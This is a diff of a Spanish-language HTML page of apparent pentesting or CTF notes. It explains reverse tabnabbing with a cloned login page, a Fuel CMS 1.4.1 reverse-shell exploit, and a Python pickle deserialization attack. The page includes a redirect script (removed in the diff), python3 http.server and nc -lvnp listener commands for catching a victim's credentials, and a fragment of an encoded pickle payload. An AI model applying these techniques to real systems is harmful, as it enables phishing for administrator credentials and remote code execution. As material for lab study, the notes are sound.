@@ -196,22 +196,19 @@
 	<h2>Tabnabbing inverso</h2>
 
 	<p>
-	Si en una pagina nos encontramos con el parametro <code> target="_blank" </code>, se puede explotar usando una replica de la pagina de inicio de sesión, incitando al administrador a introducir sus credenciales cuando haga clic en nuestro enlace, lo que debe contener es este script:</p>
-	<code>
-
-	window.opener.location = ‘http://IP:PUERTO/paginaDeLogin.html';
-	
-	</code>
-	
-	<p>
-	Una vez creado el script debemos guardarlo como html, y en el directorio donde tengamos el script en html y la pagina de login, abrimos un <code>python3 http.server 80</code>, en otro lado un <code>nc -lvnp [puerto del script]</code> y a esperar a que la victima ponga sus credenciales.	
+	Si en una pagina nos encontramos con el parametro <code> target="_blank" </code>, se puede explotar usando una replica de la pagina de inicio de sesión, incitando al administrador a introducir sus credenciales cuando haga clic en nuestro enlace, lo que debe contener es este script:
+	<a href="tabnabbing.txt" target="_blank">Exploit Tabnabbing</a>. Una vez creado el script debemos guardarlo como html, y en el directorio donde tengamos el script en html y la pagina de login, abrimos un <code>python3 http.server 80</code>, en otro lado un <code>nc -lvnp [puerto del script]</code> y a esperar a que la victima ponga sus credenciales.	
 	</p>
 	
 
 	<h2>Exploit Fuel CMS 1.4.1</h2>
 
-	<p>Si en un servidor nos encontramos con un login asi <code>http://IP/structure/index.php/fuel/login/</code> podemos usar un script que inyecta una shell reversa al ejecutarlo <a href="fuelCMS1.4.1.html">Exploit Fuel CMS 1.4.1</a>. Lo ejecutas asi <code>python3 exploit.py</code> </p>
-    <h2>
+	<p>Si en un servidor nos encontramos con un login asi <code>http://IP/structure/index.php/fuel/login/</code> podemos usar un script que inyecta una shell reversa al ejecutarlo <a href="fuelCMS1.4.1.txt" target="_blank">Exploit Fuel CMS 1.4.1</a>. Lo ejecutas asi <code>python3 exploit.py</code>. Con esto conseguimos un acceso de comandos remoto. </p>
+    
+	<h2>Aplicacion web python hecha con Pickle </h2>
+	<p>Si en una maquina nos encontramos con esto: <a href="pickle1.txt" target="_blank">Ejemplo</a>, es un script que recibe datos, los decodifica y los ejecuta como código. Podemos aprovecharlo creando esto: <a href="pickle2.txt" target="_blank">Exploit Pickle</a>, cuando lo ejecutemos con <code>python3 exploit.py</code> nos devolvera algo asi <code>b'gASVRgAAAAAAAACMBXBvc2l4lIwGc3lzdGVtl'</code>, copiamos lo que esta dentro de las comillas, antes del paso final, recordemos la ruta del endpoint de la app del primer ejemplo <code>/heaven</code> y el parámetro que recibe el servidor por post <code>awesome</code></p>
+
+<h2>
       Directorios de interes
     </h2>
     <p>
